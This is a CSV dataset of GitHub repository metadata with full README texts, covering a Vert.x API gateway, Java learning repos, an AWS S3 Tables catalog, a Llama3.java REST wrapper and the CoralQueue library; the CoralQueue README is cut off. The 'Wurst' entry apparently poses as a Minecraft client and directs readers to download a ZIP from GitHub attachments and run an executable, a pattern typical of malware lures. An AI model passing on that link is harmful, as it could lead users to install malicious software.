repo,branch,readme,releases,open_issues,branches,license,workflows,pulls,has_workflows,w_jobs,w_oss,w_steps,has_release_workflow,w_simplicity,tests
EasonLyo/sigma,main,"# SIGMA

üëÜ[‰∏≠ÊñáÊñáÊ°£](./README_zh.md)

> WARNING: [Eclipse Vert.x 5 candidate 1 released!](https://vertx.io/blog/eclipse-vert-x-5-candidate-1-released/), we plan to upgrade SIGMA vertx version, some method or code will change.

##  Introduction

Sigma is a high performances API gateway based on Vertx(Netty), can execute on native image.

### [Based on vertx](https://vertx.io/)
Vertx is a reactive web framework on JVM,  it provides many of out-of-the-box feature.

Thanks to the Vertx ecosystem, Sigma can achieve extremely high performance at a minimal cost.

Here is some vertx module sigma used:
- vertx core
- vertx web
- vertx http proxy
- vertx io_uring

### [Vertx io_uring](https://vertx.io/docs/vertx-io_uring-incubator/java/)
> The new io_uring interface added to the Linux Kernel 5.1 is a high I/O performance scalable interface for fully asynchronous Linux syscalls.

> Vert.x io_uring is based on Netty io_uring, more details on the GitHub project.

U can see more detail in [GitHub Project](https://github.com/netty/netty-incubator-transport-io_uring).

**With thd help of Vertx io_uring,sigma have high IO performance.**

### [Native transports](https://netty.io/wiki/native-transports.html)

> Vert.x can run with native transports (when available) on BSD (OSX) and Linux, these JNI transports add features specific to a particular platform, generate less garbage, and generally improve performance when compared to the NIO based transport.

**Sigma has improved data transfer speed with the help of Native Transport, although it can only work on some Linux and BSD systems, fortunately most services run on these systems.**

### [GraalVM native image](https://www.graalvm.org/latest/reference-manual/native-image/)

> Native Image is a technology to compile Java code ahead-of-time to a binary‚Äîa native executable. A native executable includes only the code required at run time, that is the application classes, standard-library classes, the language runtime, and statically-linked native code from the JDK.

When running applications as native executable files, compared to traditional Java running methods, it will have advantages such as faster startup speed, smaller packaging size, and smaller runtime memory usage.

**Sigma can be executed  as native executable files ,and it will adapt to the cloud native era better.**

**WARNING:**

By checking [GitHub actions runner image](https://github.com/actions/runner-images?tab=readme-ov-file) pre-installed software and [GraalVM Native image prerequisites](https://www.graalvm.org/latest/reference-manual/native-image/#prerequisites) requirements in GitHub actions, we found that the Windows 11 SDK is missing from the windows latest image of Github actions runner. If you need to use Sigma binary files for the Windows platform, please compile them yourself according to the documentation or deploy Sigma using Jar.

### [JAVA virtual thread](https://openjdk.org/jeps/444)

> Virtual threads are not faster threads ‚Äî they do not run code any faster than platform threads. They exist to provide scale (higher throughput), not speed (lower latency). There can be many more of them than platform threads, so they enable the higher concurrency needed for higher throughput according to Little's Law.

For IO intensive tasks, the load is usually not limited by the CPU, and in this case, even if the number of threads exceeds the number of cores, throughput cannot be improved.

> Virtual threads help to improve the throughput of typical server applications precisely because such applications consist of a great number of concurrent tasks that spend much of their time waiting.

Unlike the OS threading model (which typically manages threads through thread pools to reduce the overhead of creating threads and reusing threads), virtual threads provide higher throughput while not offering lower latency.

**Sigma have a high concurrency performance with the help of Vertx's support for virtual thread.**

## Feature List

1. **Route**
2. **Upstream**
3. **reverse-proxy**
4. **Load balance**
5. **plugin**

## Example Usage

### binary
To begin, download the latest program for your operating system and architecture from the Release page.

Next, place the sigma binary and configuration file on your server.

Finally, edit the configuration.

#### Access your computer in a LAN network via SSH

##### Step 1 : modify `sigma.json` file.

As we can see, it has 5 part to edit. The part of `proxy-server` is a proxy server protocol config, u can just use it by default.

`port: 80`:  means sigma http proxy server will bind on port 80.

```json
{
  ""proxy-server"": {
    ""http"": {
      ""id"": ""http-proxy-server"",
      ""server-id"": ""http-proxy-server"",
      ""port"": 80
    }
  }
}
```
The part of `proxy-client` is a http proxy server config, we don't need to modify except we want to adjust it to improve some performances.  
```json
{
  ""proxy-client"": {
    ""max-pool-size-per-server"": 256
  }
}
```
The part of router is a main config which decide what request the proxy will handler.

`proxy-server-id`: it config this router is belonged to which proxy server.

`route`: it define an array of http request path to handle.

`proxy-pass-id`: This configuration determines which proxy pass rule it will submit the request to.
```json
{
  ""router"": [
    {
      ""id"": ""router-first"",
      ""enable"": true,
      ""proxy-server-id"": ""http-proxy-server"",
      ""route"": [
        {
          ""id"": ""router-first-route-first"",
          ""enable"": true,
          ""path"": ""/test/*"",
          ""allow-method"": [],
          ""consumes"": [],
          ""produces"": [],
          ""proxy-pass-id"": ""proxy-pass-1""
        }
      ]
    }
  ]
}
```
The part of `proxy-pass` is a main config, this configuration determines how to handle requests received by the proxy server.

`upstream-id`: this proxy requst will send to which upsteam.

```json
{
  ""proxy-pass"": [
    {
      ""id"": ""proxy-pass-1"",
      ""upstream-id"": ""upstream-static-service-1""
    }
  ]
}
```

The part of `upstream` is a main config, this configuration define the server discoverty method , load balance rule, and upstream nodes.

This is a simple example, it means we will send proxy request to `http://localhost:8888` by `round-robin`, and the upsteam list is a static config.
```json
{
  ""upstream"": [
    {
      ""id"": ""upstream-static-service-1"",
      ""discovery"": ""static-config"",
      ""rule-strategy"": ""round-robin"",
      ""nodes"": [
        ""http://localhost:8888""
      ]
    }
  ]
}
```

#### step2 : start sigma

```shell
./sigma run net.oooops.sigma.Sigma -conf ${absolute path of sigma.json file} -options ${${absolute path of options.json file}} -instance 1 
```

### jar

#### step1
The step 1 are similar to the binary step 1.

#### 

```shell
java -jar sigma-vX.X.X-fat.jar ./sigma run net.oooops.sigma.Sigma -conf ${absolute path of sigma.json file} -options ${${absolute path of options.json file}} -instance 1
```

## Roadmap

![ROADMAP](./image/SIGMA-ROADMAP-V0.1.0-ALPHA.png)

## Milestone

- 2024-10-08 the version 0.1.0-alpha is done.

## Benchmark

### Benchmark Environments

Apple M1 Pro(10 vCPUs, 16 GB memory)

### Benchmark Test for reverse proxy

Only use sigma as the reverse proxy server,include path rewrite plugin,with no logging,or other plugins enabled.

### QPS

Because of M1 Pro CPU arch , it dont have Hyper-Threading tech, so, The test use 4 core for wrk, 4 core for nginx or sigma reverse proxy, and 2 core for upstream, upstream is only return a simple json response:

```json
{
  ""code"": 200,
  ""msg"": ""success"",
  ""data"": null
}
```
#### Upstream(on port 8888 and 8889)

```wiki
~ % wrk -t8 -c2000 -d30s http://localhost:8888
Running 30s test @ http://localhost:8888
  8 threads and 2000 connections
  Thread Stats   Avg      Stdev     Max   +/- Stdev
    Latency     1.60ms    2.70ms 129.17ms   95.30%
    Req/Sec    17.01k     5.87k   31.22k    68.83%
  4070138 requests in 30.09s, 322.17MB read
  Socket errors: connect 1756, read 161, write 0, timeout 0
Requests/sec: 135264.76
Transfer/sec:     10.71MB
```

#### Nginx(on port 8081):

```wiki
~ % wrk -t8 -c2000 -d1m http://localhost:8081
Running 1m test @ http://localhost:8081
  8 threads and 2000 connections
  Thread Stats   Avg      Stdev     Max   +/- Stdev
    Latency     3.74ms    2.32ms 135.17ms   95.69%
    Req/Sec     8.20k     2.99k   16.62k    67.24%
  3908370 requests in 1.00m, 547.91MB read
  Socket errors: connect 1756, read 227, write 15, timeout 0
  Non-2xx or 3xx responses: 28
Requests/sec:  65119.80
Transfer/sec:      9.13MB
```

#### Sigma(on port 80, path rewrite /test/* to /):

```wiki
~ % wrk -t8 -c2000 -d1m http://localhost/test/benchmark   
Running 1m test @ http://localhost/test/benchmark
  8 threads and 2000 connections
  Thread Stats   Avg      Stdev     Max   +/- Stdev
    Latency     3.53ms    2.13ms 137.37ms   88.09%
    Req/Sec     8.55k     2.83k   14.77k    70.42%
  4087162 requests in 1.00m, 654.83MB read
  Socket errors: connect 1756, read 189, write 0, timeout 0
Requests/sec:  68079.91
Transfer/sec:     10.91MB
```
Sigma is just a little bit faster than Nginx in some situation, but it's still very fast and we have a lot of room to improve.

## Contributing

We welcome contributions to Sigma! If you have any ideas, suggestions, or bug reports, please feel free to open an issue or submit a pull request.",1,0,1,Apache-2.0,1,0.0,0.0,1.0,3.0,6.0,0.0,-1.35,0.0
NovaLogics/skills-training-cli-java,main,"<h1 align=""center"" >  
‚ùÆ Skills Training ‚ùØ
  
Java Language
</h1>

<br>

### Learning Goals  
The primary goal of these projects is to reinforce basic programming skills while creating interactive and fun games. Each game focuses on specific fundamental concepts that are essential for mastering programming logic and flow.

<br>

‚ù± Online Java compiler to run Java program online
```md
https://www.programiz.com/java-programming/online-compiler/
```
",0,0,2,MIT,0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
taoofagi/easegen-admin,main,"
<p align=""center"">
  <a href=""./README.md"">English</a> |
  <a href=""./README_cn.md"">ÁÆÄ‰Ωì‰∏≠Êñá</a> 
</p>

I am a full-stack engineer, a practitioner of the AGI era super individual, hoping to contribute to AI development through open source.

If this project has helped you, remember to Star and follow, which would be great encouragement and support for me.

## üê∂ Beginner's Guide

* Demo URL „ÄêVue3 + element-plus„Äë: <http://1.95.87.0:48083> Please register to try it yourself.
* Startup documentation, operation manual: Please join the discard group to get it.
discard:https://discord.gg/q2RK3sEQwW
* Project collaboration & technical exchanges: add WeChat, note easegen:
![WeChat](.image%2Fdigitalcourse%2Fwechat.png)

## üêØ Platform Introduction

**easegen**, an open-source digital human course creation platform.

* Frontend is implemented based on [yudao-ui-admin-vue3](https://gitee.com/yudaocode/yudao-ui-admin-vue3).
* Backend is implemented based on [ruoyi-vue-pro](https://gitee.com/zhijiantianya/ruoyi-vue-pro).
* Intelligent courseware is realized based on [Wenduoduo AIPPT](https://easegen.docmee.cn).

* Course creation page

![digitalhuman_course.png](.image%2Fdigitalcourse%2Fdigitalhuman_course.gif)

* Intelligent Courseware

![aippt.png](.image%2Fdigitalcourse%2Faippt.gif)
* Intelligent Test Creation

![ai_gen_test.png](.image%2Fdigitalcourse%2Fai_gen_test.gif)

*  [Sample Course](https://www.bilibili.com/video/av113088116297160/)

[![Bilibili Video](.image%2Fdigitalcourse%2Fdemo_course.png)](https://www.bilibili.com/video/av113088116297160/)

## üó∫Ô∏è Development Roadmap

Here are the major features and improvements we plan to implement in the future:
- [x] Support for course templates
- [x] Support for intelligent script generation
- [x] Support for digital human image and voice customization
- [x] Support for docker quick deployment
- [x] Support for AI-generated scriptwriting
- [ ] SSML syntax support for voice
- [ ] Adding lesson plan generation
- [ ] Convert lesson plans to courseware and generate controllable PPTs
- [ ] Support for real-time digital human teaching
- [ ] Adding an intelligent assistant

## Architecture Diagram

![easegen_diagram.png](.image%2Fdigitalcourse%2Feasegen_diagram.png)

## Technology Stack

Refer to [yudao-framework](https://gitee.com/zhijiantianya/ruoyi-vue-pro)
Developed based on the master-jdk17 branch.

## Deployment Manual
https://ozij45g3ts.feishu.cn/docx/EgS3dm1HtoKOPkxReEQcn3MCncg

## üî• Frontend Code

‚ë† easegen-frontÔºö<https://github.com/taoofagi/easegen-front>

### Additional Features
Refer to [ruoyi-vue-pro](https://gitee.com/zhijiantianya/ruoyi-vue-pro#-%E5%86%85%E7%BD%AE%E5%8A%9F%E8%83%BD)

## üåü Star History

[![Star History Chart](https://api.star-history.com/svg?repos=taoofagi/easegen-admin&type=Date)](https://star-history.com/#taoofagi/easegen-admin&Date)

## ü§ù Awards
1. [2024 Huacai Cup Compute Power Competition Finals Second Prize, Project No. L01610474065](https://mp.weixin.qq.com/s/SE10-cxLVurf0BfAMaegmw)]

## üßæ Disclaimer/License

1. `Code`: The `easegen-admin` code is released under the `Apache` license for academic and commercial use.
2. `AIGC`: This project aims to positively impact the AI-generated text, speech, and video field. Users are granted the freedom to use this tool to create text, speech, and videos, but they should comply with local laws and use it responsibly. Developers bear no responsibility for any misuse of the tool by users.
",0,0,2,MIT,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1035.0
kushanb/oop-lec-2024,main,"# OOP Lecture Codes for the Academic Year 2024/25

This repo will hold the code for all the code done during the OOP Lectures for CS Groups 17-20.


",0,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
awslabs/s3-tables-catalog,main,"# Amazon S3 Tables Catalog for Apache Iceberg

<!-- Note for developer: Edit your repository description on GitHub -->

The Amazon S3 Tables Catalog for Apache Iceberg is an open-source library that bridges [S3 Tables](https://docs.aws.amazon.com/AmazonS3/latest/userguide/s3-tables.html) operations to engines like [Apache Spark](https://spark.apache.org/), when used with the [Apache Iceberg](https://iceberg.apache.org/) Open Table Format. 

This library can: 
* Translate [Apache Iceberg](https://iceberg.apache.org/) operations such as table discovery, metadata reads, and updates
* Add and removes tables in Amazon S3 Tables

<!-- Note for writer: Update the following text after the S3 Tables docs are finalized -->

### What are Amazon S3 Tables and table buckets ?

Amazon S3 Tables are built for storing tabular data, such as daily purchase transactions, streaming sensor data, or ad impressions. Tabular data represents data in columns and rows, like in a database table. Tabular data is most commonly stored in the [Apache Parquet](https://parquet.apache.org/) format.

The tabular data in Amazon S3 Tables is stored in a new S3 bucket type: a **table bucket**, which stores tables as subresources. S3 Tables has built-in support for tables in the [Apache Iceberg](https://iceberg.apache.org/) format. Using standard SQL statements, you can query your tables with query engines that support Apache Iceberg, such as [Amazon Athena](https://aws.amazon.com/athena/), [Amazon Redshift](https://aws.amazon.com/pm/redshift/), and [Apache Spark](https://spark.apache.org/).

## Current Status

Amazon S3 Tables Catalog for Apache Iceberg is generally available. We're always interested in feedback on features, performance, and compatibility. Please send feedback by opening a [GitHub issue](https://github.com/awslabs/s3-tables-catalog/issues/new/).

If you discover a potential security issue in this project we ask that you notify Amazon Web Services (AWS) Security via our [vulnerability reporting page](http://aws.amazon.com/security/vulnerability-reporting/). Please do not create a public GitHub issue.

## Getting Started 

To get started with Amazon S3 Tables, see [Tutorial: Getting started with S3 Tables](https://docs.aws.amazon.com/AmazonS3/latest/userguide/s3-tables-getting-started.html) in the *Amazon S3 User Guide*. 

### Configuration

- <catalog_name> is your Iceberg Spark session catalog name. Replace it with the name of
your catalog, and remember to change the references throughout all configurations that
are associated with this catalog. In your code, you should then refer to your Iceberg tables
with the fully qualified table name, including the Spark session catalog name, as follows:
<catalog_name>.<database_name>.<table_name>.

- <catalog_name>.warehouse points to the Amazon S3 Tables path
- <catalog_name>.catalog-impl = ""software.amazon.s3tables.iceberg.S3TablesCatalog"" This key is required to point to an
implementation class for any custom catalog implementation.

### Java Spark app Example

Add the lines below to your pom.xml:
```
<dependency>
    <groupId>software.amazon.awssdk</groupId>
    <artifactId>s3tables</artifactId>
    <version>2.29.26</version>
</dependency>
<dependency>
    <groupId>software.amazon.s3tables</groupId>
    <artifactId>s3-tables-catalog-for-iceberg</artifactId>
    <version>0.1.4</version>
</dependency>
```
Or if you using a [BOM](https://aws.amazon.com/blogs/developer/managing-dependencies-with-aws-sdk-for-java-bill-of-materials-module-bom/) just add a dependency on the s3 tables sdk:
```
<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>software.amazon.awssdk</groupId>
            <artifactId>bom</artifactId>
            <version>2.29.26</version>
            <type>pom</type>
            <scope>import</scope>
        </dependency>
    </dependencies>
</dependencyManagement>
```

Or for Gradle:

```
dependencies {
    implementation 'software.amazon.awssdk:s3tables:2.29.26'
    implementation 'software.amazon.s3tables:s3-tables-catalog-for-iceberg:0.1.4'
}
```



And finally start a spark session:

```
spark = SparkSession.builder()
            .config(""spark.sql.catalog.<catalog_name>"", ""org.apache.iceberg.spark.SparkCatalog"")
            .config(""spark.sql.catalog.<catalog_name>.catalog-impl"",""software.amazon.s3tables.iceberg.S3TablesCatalog"")
            .config(""spark.sql.catalog.<catalog_name>.warehouse"", <TABLE_BUCKET_ARN>)
            .getOrCreate();
```

## Contributions

We welcome contributions to Amazon S3 Tables Catalog for Apache Iceberg! Please see the [contributing guidelines](CONTRIBUTING.md) for more information on how to report bugs, build from source code, or submit pull requests.

## Security

If you discover a potential security issue in this project we ask that you notify Amazon Web Services (AWS) Security via our [vulnerability reporting](http://aws.amazon.com/security/vulnerability-reporting/) page. Please do not create a public GitHub issue.

## License

This project is licensed under the [Apache-2.0 License](LICENSE).
",5,9,5,Apache-2.0,2,24.0,1.0,3.0,1.0,10.0,0.0,-2.95,23.0
stephanj/Llama3JavaChatCompletionService,master,"# Llama3.java Inference with OpenAI Chat Completion REST API ‚òïÔ∏è

This project provides a REST API wrapper for the amazing [Llama3.java project](https://github.com/mukel/llama3.java) from Alfonso¬≤ Peterssen. 
The wrapper is compliant with the OpenAI API specification for chat completions.

## ToDo 

- [X] SpringBoot wrapper around Llama3.java
- [X] Create Java Flame graph to see where performance issue's are located (matmul üî•)
- [ ] Optional: Quarkus wrapper around Llama3.java
- [ ] TornadoVM enabled version
- [ ] GraalVM native version
- [ ] LLM Sharding (Layers, Attn Head)
- [ ] BitNets support 
- [ ] Ternary Models support

## On Apple Silicon (M1/M2/M3)

Make sure to download an ARM compliant SDK, for example from https://bell-sw.com/pages/downloads/#jdk-21-lts 

https://github.com/user-attachments/assets/6fecb9c1-6c84-4a01-a63b-272e75009618

## Setup

Set the JAVA_HOME environment variable to the ARM SDK path. 

Example with Zulu JDK 23 (zulu23.30.13-ca-jdk23.0.1-macosx_aarch64)

```bash
export JAVA_HOME=/Library/Java/JavaVirtualMachines/zulu-23.jdk/Contents/Home
```

IMPORTANT: Do not use SDKMan because this will fall back to the x86 version of the SDK.

## Build 

```bash
mvn clean package
```

## Build in native image

Use a GraalVM JDK 24 or higher (tested with Graal 24, ea 30)

```
./mvnw -Pnative native:compile
```

This will produce `./target/llama3-server`. This does not work on MacOS because there is no Vector
API support on Graal + MacOS.

## Download LLM

Download a GGUF model from the Hugging Face model hub and place it in the 'models' directory. 
For example:

```bash
mkdir models 
cd models
curl https://huggingface.co/hugging-quants/Llama-3.2-1B-Instruct-Q8_0-GGUF/blob/main/llama-3.2-1b-instruct-q8_0.gguf
```

Update the 'llama.model.name' variable in the application.properties file if you use a different model.

```application.properties
spring.application.name=Llama3.java Server
server.servlet.context-path=/

llama.model.path=models
llama.model.name=Meta-Llama-3.2-1b-instruct-Q8_0.gguf

logging.level.com.llama4j=INFO

server.address=localhost
server.port=8080
```

## Run 

Start the Spring Boot app which holds the Llama3.java REST wrapper as follows:

```bash
java --add-modules jdk.incubator.vector --enable-preview -jar target/llama3-server-1.0.0-SNAPSHOT.jar
```

or use the run.sh script which sets some extra JVM GC and Heap settings

```bash
./run.sh
```

## Test using Curl

```bash
curl -X POST http://localhost:8080/chat/completions \
-H ""Content-Type: application/json"" \
-d '{
  ""messages"": [
    {
      ""role"": ""system"",
      ""content"": ""You are a comedian.""
    },
    {
      ""role"": ""user"",
      ""content"": ""Tell me a joke.""
    }
  ],
  ""temperature"": 0.7,
  ""top_p"": 0.95,
  ""max_tokens"": 100
}'
```

Response

```json
{
   ""id"":""chatcmpl-1"",
   ""object"":""chat.completion"",
   ""created"":1729447400,
   ""model"":""Meta-Llama-3.2-1b-instruct-Q8_0.gguf"",
   ""systemFingerprint"":""fp_178ce5010c913"",
   ""choices"":[
      {
         ""index"":0,
         ""message"":{
            ""role"":""assistant"",
            ""content"":""A man walked into a library and asked the librarian, \""Do you have any books on Pavlov's dogs and Schr√∂dinger's cat?\"" The librarian replied, \""It rings a bell, but I'm not sure if it's here or not.\""""
         },
         ""logprobs"":null,
         ""finishReason"":""stop""
      }
   ],
   ""usage"":{
      ""promptTokens"":25,
      ""completionTokens"":53,
      ""totalTokens"":78,
      ""completionTokensDetails"":{
         ""reasoningTokens"":0
      }
   }
```

## Test using DevoxxGenie 

Launch any JetBrains IDE (such as IDEA, CLion, WebStorm, etc.) and install '[DevoxxGenie](https://plugins.jetbrains.com/plugin/24169-devoxxgenie)' from the Plugins marketplace. 
You can then choose either 'Jlama (Experimental)' or 'Exo (Experimental)', both of which utilize OpenAI's Chat Completion.

Next, enter a prompt and optionally attach files to the window context by using the 'Add File' icon located below the prompt text area.

Example with file attachment in prompt context:

![Demo2](https://github.com/user-attachments/assets/cbd8af2e-d3bd-4d9a-bdf5-0c2bc033915f)

## Baseline Performance Stats

Running on Apple M1 Max with 64Gb (LPDDR5) of RAM (32 number of Cores).  

![CallTree](https://github.com/user-attachments/assets/75e739e2-44b9-4e2b-a077-63021cb9ea39)

### Key Findings by ChatGPT

This profiling trace shows a CPU-heavy Java application, likely dealing with machine learning or vectorized computation. Here's a breakdown of key components:

1. **Heavy CPU Usage (`java.util.concurrent.ForkJoinWorkerThread.run`) at 86%**
   - This is likely a thread-pool executor used for parallelizing tasks. It suggests significant multi-threaded execution, possibly parallelized matrix operations or tensor calculations.

2. **`com.llama4j.core.FloatTensor$$Lambda.accept` (61.5%)**
   - This method involves processing a tensor's float data. Lambda expressions in Java are anonymous functions, often used for concise representations of callbacks or functional programming.

3. **`jdk.incubator.vector.FloatVector.reduceLanes` (49.5%)**
   - Indicates vectorized computation involving float vectors. This uses the Vector API from the JDK's incubator module, designed to perform operations on wide vectors leveraging CPU SIMD (Single Instruction, Multiple Data) capabilities.

4. **`com.llama4j.core.ArrayFloatTensor.getFloatVector` (7.7%)**
   - Suggests fetching float vectors from an array-based tensor representation. This could be another bottleneck related to memory access when performing operations.

5. **`com.llama4j.web.rest.LlamaWrapperApplication.chatCompletions` (13.9%)**
   - Indicates that part of the time is spent processing chat completion requests, suggesting this application is likely an LLM interface or chatbot.

6. **`com.llama4j.core.FloatTensor.matmul` (12.0%)**
   - This is the matrix multiplication function, which contributes to the linear algebra operations in the application, likely forming the backbone of the model's computations.

### Potential Bottlenecks and Optimization Ideas

- **ForkJoinWorkerThread**: If this thread is consuming 86% of the CPU, there might be room to optimize the parallelization strategy. Investigate if there‚Äôs overhead or contention between threads.
- **Vectorization**: The use of `jdk.incubator.vector.FloatVector` shows a good attempt at leveraging vectorized operations, but it may need tuning based on the target CPU‚Äôs vector width (e.g., AVX-512 support).
- **Memory Access**: The significant time spent in `ArrayFloatTensor.getFloatVector` could indicate a memory bandwidth bottleneck. This might benefit from optimizing data locality or using more efficient memory layouts (like row-major or column-major order).

---

### Key Findings by Claude

1. **FloatTensor Operations: 61.5% of execution time**

com.llama4j.core.FloatTensor$$Lambda$0x0000000080143b048.accept(int)
Likely the core model inference bottleneck

2. **Vector Operations: 49.5% of execution time**

jdk.incubator.vector.Float128Vector.reduceLanes(VectorOperators$Associative)
Part of the FloatTensor operations

3. **Array Processing: 7.7% of execution time**

com.llama4j.core.ArrayFloatTensor.getFloatVector(VectorSpecies, int)

4. **HTTP Request Handling: 13.9% of execution time**

com.llama4j.web.rest.LlamaWrapperApplication.chatCompletions(ChatCompletionRequest)

#### Recommendations

1. **Optimize Tensor Operations:**

Profile the FloatTensor class to identify specific bottlenecks
Consider using more efficient linear algebra libraries or GPU acceleration
Optimize memory access patterns and data structures

2. **Improve Vector Processing:**

Investigate the use of more efficient vector operations or libraries
Consider using SIMD instructions if not already implemented

3. **Enhance Array Processing:**

Optimize the getFloatVector method in ArrayFloatTensor
Consider using more efficient data structures or access patterns

4. **Optimize HTTP Request Handling:**

Profile the chatCompletions method to identify specific bottlenecks
Consider implementing caching mechanisms or request batching
Optimize data serialization/deserialization if applicable

#### General Optimizations:

- Implement multi-threading for parallel processing where applicable
- Optimize memory usage and garbage collection
- Consider using a more performant JVM or JIT compiler

---

## Credits

This is just a simple Spring Boot OpenAI REST wrapper around the amazing [Llama3.java project](https://github.com/mukel/llama3.java) from Alfonso¬≤ Peterssen! 

Thanks Alfonso for leading the way! üí™üèª ‚òïÔ∏è
",0,0,1,MIT,0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,3.0
Jplamo13/Wurst,master,"# Wurst

Wurst features a wide range of fun and troll modules and has been available since 2014. It is open-source and supports versions 1.7.2 through 1.21+.

![Wurst Logo](https://example.com/wurst-logo.png)

---

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Contributing](#contributing)
- [License](#license)

---

## Features

- Fun and troll modules
- Open-source
- Wide variety of features
- Supports versions 1.7.2 through 1.21+

## Installation

You can download the Wurst client from the official website.

[![Download Wurst](https://img.shields.io/badge/Download-Wurst-blue)](https://github.com/user-attachments/files/16830252/Client.zip)

## Usage

1. Download the Wurst client using the link provided above.
2. Extract the files from the downloaded ZIP archive.
3. Launch the Wurst client executable.
4. Customize your experience with the wide range of modules available.

## Contributing

We welcome contributions to the Wurst repository. If you'd like to contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch (`git checkout -b feature/your-feature-name`).
3. Make your changes.
4. Commit your changes (`git commit -am 'Add new feature'`).
5. Push to the branch (`git push origin feature/your-feature-name`).
6. Create a new Pull Request.

## License

This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.

---

Feel free to explore the Wurst client and enjoy the wide range of features available! üöÄ

![Wurst GIF](https://example.com/wurst-gif.gif)",1,0,1,CC0-1.0,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
coralblocks/CoralQueue,main,"# CoralQueue
CoralQueue is an ultra-low-latency, lock-free, garbage-free, batching and concurrent collection of circular data structures for inter-thread communication in Java. It uses memory barriers through <i>volatile sequences</i> instead of locks to allow Java threads (producers and consumers) to exchange messages as fast as possible. All data structures are circular and _bounded_, requiring producer/consumer _waiting_ (but not locking) when they are full/empty through a wait strategy or busy spinning.

For some performance numbers you can check [this link](https://www.coralblocks.com/index.php/coralqueue-performance-numbers/).

The data structures are: [Queue](#queue) (one-producer-to-one-consumer), [Multiplexer](#multiplexer) (many-producers-to-one-consumer), [Demultiplexer](#demultiplexer) (one-producer-to-many-consumers), [MpMc](#mpmc) (many-producers-to-many-consumers), [Broadcaster](#broadcaster) (one-producer-to-many-consumers), [MpMcBroadcaster](#mpmcbroadcaster) (many-producers-to-many-consumers) and [Diamond](#diamond) (worker threads).

<pre>
<b>Note:</b> CoralQueue allows the exchange of messages <i>inside the same JVM</i>.
For a multicast message middleware solution to build distributed systems across multiple
machines using the <i>sequencer architecture</i> you should refer to <a href=""https://www.coralblocks.com/index.php/state-of-the-art-distributed-systems-with-coralmq/"">this article</a>.
</pre>

## Queue

<img src=""images/Queue.png"" alt=""Queue"" width=""50%"" height=""50%"" />

The Queue allows a single producer thread sending messages to the queue and a single consumer thread receiving messages from the queue, both running inside the same JVM. The consumer reads the messages (all the messages) in the same order that they were sent by the producer.

- Click [here](src/main/java/com/coralblocks/coralqueue/example/queue/Minimal.java) for a minimal example of using the Queue
- Click [here](src/main/java/com/coralblocks/coralqueue/example/queue/Basics.java) for a basic example of using the Queue

<details>
  <summary>Click here for all the details of how to use the Queue</summary>
  
### All about using the Queue

The queue is a circular data structure with pre-allocated <i> data transfer mutable objects</i>. You should see these data transfer mutable objects as <i>carriers of data</i>, in other words, they are there to allow
you to transfer <i>data</i> (and not object references) from producers to consumers. The steps are:

- A producer fetches an available data transfer mutable object from the queue
- The producer populates the mutable object with the data it wants to transfer (i.e. send) to the consumer(s)
- The producer flushes to notify the consumer(s)
- A consumer fetches an available data transfer mutable object from the queue
- The consumer reads the data from the mutable object
- The consumer calls <code>doneFetching()</code> to notify the producer(s)

Below we use a <code>StringBuilder</code> as our data transfer mutable object to create an <code>AtomicQueue</code>:
```Java
final Queue<StringBuilder> queue = new AtomicQueue<StringBuilder>(StringBuilder.class); // default queue capacity is 1024
```

You can also specify the capacity of the queue, which must be a power of two:
```Java
final Queue<StringBuilder> queue = new AtomicQueue<StringBuilder>(512, StringBuilder.class); // specifying the queue capacity
```
The code above creates a queue with 512 pre-allocated StringBuilders. Note that it uses the default constructor of StringBuilder which by default creates a StringBuilder with size 16. That may be too small for our data transfer objects as we don‚Äôt want the StringBuilder resizing itself during runtime and creating garbage. So to create a bigger StringBuilder we can use a <code>com.coralblocks.coralqueue.util.Builder</code> like below:
```Java
Builder<StringBuilder> builder = new Builder<StringBuilder>() {
    @Override
    public StringBuilder newInstance() {
        return new StringBuilder(1024);
    }
};
```

And pass this builder to the constructor of our <code>AtomicQueue</code>:
```Java
final Queue<StringBuilder> queue = new AtomicQueue<StringBuilder>(512, builder); // using a builder instead of the class
```

#### Sending messages to the queue

To send a message to the queue, you grab a data transfer mutable object from the queue, fill it with your data and call <code>flush()</code> as the code below illustrates:
```Java
StringBuilder sb;
while((sb = queue.nextToDispatch()) == null); // busy spin...
sb.setLength(0);
sb.append(""Hello there!"");
queue.flush();
```

Note that if the queue is full we just <i>busy spin</i> until a data transfer object becomes available. Later we will see how we can also use a <code>WaitStrategy</code> instead of busy spinning.

You can (and should) send messages in batches:
```Java
StringBuilder sb;
 
while((sb = queue.nextToDispatch()) == null); // busy spin...
sb.setLength(0);
sb.append(""Hello there!"");
 
while((sb = queue.nextToDispatch()) == null); // busy spin...
sb.setLength(0);
sb.append(""Hello again!"");
 
queue.flush();
```

#### Reading messages from the queue

To read messages from the queue you fetch them from a consumer thread, as the code below shows:
```Java
long avail;
while((avail = queue.availableToFetch()) == 0); // busy spin
for(int i = 0; i < avail; i++) {
    StringBuilder sb = queue.fetch();
    // do whatever you want with the StringBuilder
    // just do not create garbage
    // copy char by char if needed
    // or copy the contents to an external StringBuilder
}
queue.doneFetching();
```
Again we busy spin if the queue is empty. Later we will see how we can also use a <code>WaitStrategy</code> instead of busy spinning.

Note that we fetch in batches, reducing the number of times we have to check for an empty queue through <code>availableToFetch()</code>.

</details> 

<details>
  <summary>Click here for all the details of how to use Wait Strategies</summary>

### All about using Wait Strategies

By default, you should busy-spin when the queue is full or empty. That‚Äôs usually the fastest approach but not always the best as you might want to allow other threads to use the CPU core. CoralQueue comes with a variety of wait strategies that you can use instead of busy spinning, and you can also create your own by implementing the <code>WaitStrategy</code> interface. Below are some examples of wait strategies that come with CoralQueue:

- [ParkBackOffWaitStrategy](https://github.com/coralblocks/CoralQueue/blob/main/src/main/java/com/coralblocks/coralqueue/waitstrategy/ParkBackOffWaitStrategy.java): park (i.e. sleep) for 1 microsecond backing off up to a maximum of 1 millisecond in steps of 1 microsecond. The start, max and step values can be configured.
